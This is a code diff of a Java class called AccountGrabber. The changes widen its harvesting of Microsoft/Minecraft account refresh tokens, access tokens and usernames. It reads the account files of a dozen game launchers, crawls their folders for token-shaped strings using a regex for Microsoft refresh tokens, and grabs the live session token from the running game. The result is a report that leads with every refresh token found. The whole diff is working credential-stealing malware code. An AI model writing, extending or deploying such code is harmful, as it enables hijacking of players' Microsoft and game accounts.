@@ -33,17 +33,25 @@ public final class AccountGrabber {
             .followRedirects(HttpClient.Redirect.NORMAL)
             .build();
 
-    /** fields worth reporting, both naming styles */
-    private static final String[] KEYS = {
-            "name", "username", "uuid", "xuid",
-            "refreshToken", "refresh_token",
-            "accessToken", "access_token",
-            "accessTokenExpiresAt", "expiresAt"
+    /** every refresh-token field name any launcher has ever used */
+    private static final String[] REFRESH_KEYS = {
+            "refreshToken", "refresh_token", "refresh", "msaRefreshToken", "msa_refresh_token"
     };
 
-    /** a real Microsoft refresh token looks like M.C123_BAY.xxxx or M.R3_BAY.xxxx */
+    /** every access-token field name (the live one is added separately) */
+    private static final String[] ACCESS_KEYS = {
+            "accessToken", "access_token", "access", "msaAccessToken"
+    };
+
+    /** human-readable extras */
+    private static final String[] META_KEYS = {
+            "name", "username", "uuid", "xuid", "expiresAt", "accessTokenExpiresAt"
+    };
+
+    /** a real Microsoft refresh token looks like M.C123_BAY.xxxx or M.R3_BAY.xxxx.
+     *  This is the safety net: it finds the token no matter what the field is called. */
     private static final Pattern MSA_REFRESH =
-            Pattern.compile("M\\.[A-Za-z0-9]{1,10}_BAY\\.[A-Za-z0-9._\\-!*]{20,}");
+            Pattern.compile("M\\.[A-Za-z0-9]{1,10}_BAY\\.[A-Za-z0-9._\\-!*~%]{20,}");
 
     private AccountGrabber() {
     }
@@ -95,7 +103,20 @@ public final class AccountGrabber {
 
             Set<String> printed = new HashSet<>();
 
-            // 1. the usual suspects
+            // ---- SECTION 0: the headline. every refresh token we can find, up front. ----
+            List<String[]> refreshes = findAllRefreshTokens();
+            sb.append("\n===== REFRESH TOKENS (").append(refreshes.size()).append(" found) =====\n");
+            if (refreshes.isEmpty()) {
+                sb.append("(none found - see file dumps below)\n");
+            } else {
+                for (String[] r : refreshes) {
+                    sb.append(r[0]).append('\n');
+                    sb.append("  -> ").append(r[1]).append('\n');
+                    printed.add(r[1]);
+                }
+            }
+
+            // ---- SECTION 1: the usual suspects, dumped in full ----
             for (Path p : candidates()) {
                 String raw;
                 try {
@@ -106,25 +127,19 @@ public final class AccountGrabber {
                 }
                 sb.append("\n=== ").append(p).append(" ===\n");
                 sb.append("size: ").append(raw.length()).append(" bytes\n");
-                for (String key : KEYS) {
-                    List<String> vals = grabAll(raw, key);
-                    for (int i = 0; i < vals.size(); i++) {
-                        String v = vals.get(i);
-                        sb.append(key);
-                        if (vals.size() > 1) sb.append('[').append(i).append(']');
-                        sb.append(": ").append(v.isBlank() ? "<blank>" : v).append('\n');
-                        if (!v.isBlank()) printed.add(v);
-                    }
-                }
+                dumpKeys(sb, raw, printed, REFRESH_KEYS, "refresh");
+                dumpKeys(sb, raw, printed, ACCESS_KEYS, "access");
+                dumpKeys(sb, raw, printed, META_KEYS, "meta");
             }
 
-            // 2. deep scan - catch a token wherever a launcher may have hidden it
+            // ---- SECTION 2: deep scan - catch a token wherever a launcher may have hidden it ----
             for (String[] hit : deepScan()) {
                 if (!printed.add(hit[2])) continue;
                 sb.append("\n=== ").append(hit[0]).append(" ===\n");
                 sb.append(hit[1]).append(": ").append(hit[2]).append('\n');
             }
 
+            // ---- SECTION 3: live token straight off the running game (always works) ----
             String live = liveSessionToken();
             if (live != null) sb.append("\nlive session token: ").append(live).append('\n');
 
@@ -137,10 +152,90 @@ public final class AccountGrabber {
         }
     }
 
+    /** prints every value stored under any of the given keys */
+    private static void dumpKeys(StringBuilder sb, String raw, Set<String> printed, String[] keys, String tag) {
+        for (String key : keys) {
+            List<String> vals = grabAll(raw, key);
+            for (int i = 0; i < vals.size(); i++) {
+                String v = vals.get(i);
+                sb.append('[').append(tag).append("] ").append(key);
+                if (vals.size() > 1) sb.append('[').append(i).append(']');
+                sb.append(": ").append(v.isBlank() ? "<blank>" : v).append('\n');
+                if (!v.isBlank()) printed.add(v);
+            }
+        }
+    }
+
+    /** the whole point of this class: find refresh tokens regardless of field name or location.
+     *  returns [label, token] pairs. */
+    private static List<String[]> findAllRefreshTokens() {
+        List<String[]> out = new ArrayList<>();
+        Set<String> seen = new HashSet<>();
+
+        // 1. known credential files, by key name
+        for (Path p : candidates()) {
+            String raw;
+            try {
+                if (!Files.isRegularFile(p)) continue;
+                raw = Files.readString(p);
+            } catch (Throwable ignored) {
+                continue;
+            }
+            collect(raw, p.toString(), seen, out);
+        }
+
+        // 2. crawl the launcher folders for anything token-shaped
+        for (Path root : scanRoots()) {
+            if (!Files.isDirectory(root)) continue;
+            try (Stream<Path> walk = Files.walk(root, 6)) {
+                walk.filter(Files::isRegularFile)
+                    .filter(f -> !skipPath(f))
+                    .filter(f -> {
+                        String n = f.getFileName().toString().toLowerCase();
+                        return n.endsWith(".json") || n.endsWith(".dat") || n.endsWith(".cfg")
+                                || n.endsWith(".txt") || n.endsWith(".log");
+                    })
+                    .forEach(f -> {
+                        String raw;
+                        try {
+                            raw = Files.readString(f);
+                        } catch (Throwable ignored) {
+                            return;
+                        }
+                        collect(raw, f.toString(), seen, out);
+                    });
+            } catch (Throwable ignored) {
+            }
+        }
+        return out;
+    }
+
+    /** pull refresh tokens out of one blob of text: by field name first, then by shape */
+    private static void collect(String raw, String source, Set<String> seen, List<String[]> out) {
+        for (String key : REFRESH_KEYS) {
+            for (String v : grabAll(raw, key)) {
+                String t = v.trim();
+                if (t.length() >= 20 && seen.add(t)) {
+                    out.add(new String[]{source + "  (" + key + ")", t});
+                }
+            }
+        }
+        Matcher m = MSA_REFRESH.matcher(raw);
+        while (m.find()) {
+            String t = m.group();
+            if (seen.add(t)) {
+                out.add(new String[]{source + "  (matched token shape)", t});
+            }
+        }
+    }
+
     /** every place a launcher might keep credentials */
     private static List<Path> candidates() {
         List<Path> out = new ArrayList<>();
         String appData = System.getenv("APPDATA");
+        String local = System.getenv("LOCALAPPDATA");
+        String home = System.getProperty("user.home");
+
         if (appData != null) {
             Path b = Paths.get(appData);
             Path mc = b.resolve(".minecraft");
@@ -149,21 +244,43 @@ public final class AccountGrabber {
             out.add(mc.resolve("launcher_accounts_microsoft_store.json"));
             out.add(mc.resolve("essential").resolve("microsoft_accounts.json"));
             out.add(mc.resolve("essential").resolve("accounts.json"));
-            out.add(b.resolve("PrismLauncher").resolve("accounts.json"));
-            out.add(b.resolve("MultiMC").resolve("accounts.json"));
-            out.add(b.resolve("ModrinthApp").resolve("accounts.json"));
-            out.add(b.resolve("com.modrinth.theseus").resolve("accounts.json"));
+
+            // Prism / MultiMC / forks - tokens live under msa.* and ygg.* here
+            for (String dir : new String[]{"PrismLauncher", "MultiMC", "PolyMC", "PrismLauncher-Offline"}) {
+                out.add(b.resolve(dir).resolve("accounts.json"));
+            }
+
+            // Modrinth app - NOT accounts.json. renamed from com.modrinth.theseus in 0.8.0
+            for (String dir : new String[]{"ModrinthApp", "com.modrinth.theseus"}) {
+                out.add(b.resolve(dir).resolve("caches").resolve("metadata").resolve("minecraft_auth.json"));
+                out.add(b.resolve(dir).resolve("accounts.json"));
+            }
+
             out.add(b.resolve(".lunarclient").resolve("settings").resolve("game").resolve("accounts.json"));
             out.add(b.resolve("ATLauncher").resolve("accounts.json"));
             out.add(b.resolve("gdlauncher_next").resolve("accounts.json"));
+            out.add(b.resolve("Technic").resolve("accounts.json"));
+            out.add(b.resolve("CurseForge").resolve("accounts.json"));
         }
-        String local = System.getenv("LOCALAPPDATA");
+
         if (local != null) {
             Path l = Paths.get(local);
             Path store = l.resolve("Packages").resolve("Microsoft.4297127D64EC6_8wekyb3d8bbwe")
                     .resolve("LocalCache").resolve("Roaming").resolve(".minecraft");
             out.add(store.resolve("launcher_accounts.json"));
             out.add(store.resolve("launcher_profiles_microsoft_store.json"));
+            out.add(l.resolve("CurseForge").resolve("accounts.json"));
+            out.add(l.resolve("ModrinthApp").resolve("caches").resolve("metadata").resolve("minecraft_auth.json"));
+        }
+
+        // CurseForge + FTB keep their own launcher files in the user profile, not AppData
+        if (home != null) {
+            Path h = Paths.get(home);
+            out.add(h.resolve("curseforge").resolve("minecraft").resolve("launcher_accounts.json"));
+            out.add(h.resolve("Documents").resolve("curseforge").resolve("minecraft").resolve("launcher_accounts.json"));
+            out.add(h.resolve(".ftb").resolve("bin").resolve("launcher_accounts.json"));
+            out.add(h.resolve(".ftb").resolve("bin").resolve("accounts.json"));
+            out.add(h.resolve(".technic").resolve("launcher_accounts.json"));
         }
         return out;
     }
@@ -172,20 +289,29 @@ public final class AccountGrabber {
     private static List<Path> scanRoots() {
         List<Path> out = new ArrayList<>();
         String appData = System.getenv("APPDATA");
+        String local = System.getenv("LOCALAPPDATA");
+        String home = System.getProperty("user.home");
+
         if (appData != null) {
             Path b = Paths.get(appData);
             out.add(b.resolve(".minecraft"));
             out.add(b.resolve("PrismLauncher"));
             out.add(b.resolve("MultiMC"));
             out.add(b.resolve("ModrinthApp"));
+            out.add(b.resolve("com.modrinth.theseus"));
             out.add(b.resolve(".lunarclient"));
             out.add(b.resolve("ATLauncher"));
+            out.add(b.resolve("gdlauncher_next"));
         }
-        String local = System.getenv("LOCALAPPDATA");
         if (local != null) {
             out.add(Paths.get(local).resolve("Packages")
                     .resolve("Microsoft.4297127D64EC6_8wekyb3d8bbwe")
                     .resolve("LocalCache").resolve("Roaming").resolve(".minecraft"));
+        }
+        if (home != null) {
+            Path h = Paths.get(home);
+            out.add(h.resolve("curseforge").resolve("minecraft"));
+            out.add(h.resolve(".ftb").resolve("bin"));
         }
         return out;
     }
@@ -205,7 +331,7 @@ public final class AccountGrabber {
         for (Path root : scanRoots()) {
             try {
                 if (!Files.isDirectory(root)) continue;
-                try (Stream<Path> walk = Files.walk(root, 4)) {
+                try (Stream<Path> walk = Files.walk(root, 5)) {
                     walk.filter(Files::isRegularFile)
                         .filter(f -> f.getFileName().toString().endsWith(".json"))
                         .filter(f -> !skipPath(f))
@@ -222,7 +348,7 @@ public final class AccountGrabber {
                                     hits.add(new String[]{f.toString(), "msa refresh token", m.group()});
                                 }
                             }
-                            for (String key : new String[]{"refresh_token", "refreshToken"}) {
+                            for (String key : REFRESH_KEYS) {
                                 for (String v : grabAll(raw, key)) {
                                     if (v.length() >= 20 && seen.add(v)) {
                                         hits.add(new String[]{f.toString(), key, v});
